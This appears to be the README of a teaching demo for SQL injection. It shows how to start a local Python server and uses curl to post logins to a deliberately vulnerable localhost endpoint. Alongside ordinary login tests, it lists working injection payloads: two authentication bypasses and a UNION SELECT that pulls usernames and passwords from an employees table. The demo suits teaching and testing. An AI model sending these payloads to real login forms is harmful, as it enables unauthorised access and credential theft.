SQL Injection Demo
==========

Execute Server
----------
```
python main.py
```

Test Server
----------
Tests are executed on Windows
```
curl -d "username=felix&password=pwfelix" -X POST http://localhost:5000/login_form_vulnerable
{"status":"success"}

curl -d "username=felix&password=wrongPW" -X POST http://localhost:5000/login_form_vulnerable
{"status":"fail"}
```

Injection basic attack
```
curl -d "username=felix&password=' OR 1 = 1;--" -X POST http://localhost:5000/login_form_vulnerable
{"status":"success"}

curl -d "username=felix&password=' OR '1' = '1" -X POST http://localhost:5000/login_form_vulnerable
{"status":"success"}
```

Injection UNION attack
curl -d "username=felix&password=' UNION SELECT username, password FROM employees WHERE username = '' OR '1' = '1" -X POST http://localhost:5000/login_form_vulnerable
{"status":"success"}
